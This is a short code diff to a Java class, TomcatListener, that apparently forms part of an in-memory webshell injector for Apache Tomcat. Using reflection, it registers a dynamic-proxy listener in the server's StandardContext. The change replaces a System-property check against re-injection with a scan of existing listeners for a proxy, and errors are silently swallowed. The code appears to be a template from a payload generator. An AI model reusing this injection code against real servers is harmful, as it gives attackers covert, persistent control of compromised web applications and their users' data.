@@ -32,16 +32,19 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
 
     private void addListener(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
+        for (Object listener :
+            (Object[]) invokeMethod(context, "getApplicationEventListeners")
+        ) {{
+            if (listener instanceof Proxy) {{
+                return;
+            }}
+        }}
         getMethodX(context.getClass(), "addApplicationEventListener", 1)
             .invoke(context, proxyObject);
     }}
 
     public TomcatListener() {{
         synchronized(lock) {{
-            if (System.getProperty("initialized") != null) {{
-                return;
-            }}
-
             Class servletRequestListener = null;
             try {{
                 servletRequestListener = Class.forName(
@@ -63,8 +66,6 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
                     addListener(proxyObject);
                 }} catch (Exception e) {{}}
             }}
-
-            System.setProperty("initialized", "true");
         }}
     }}
 
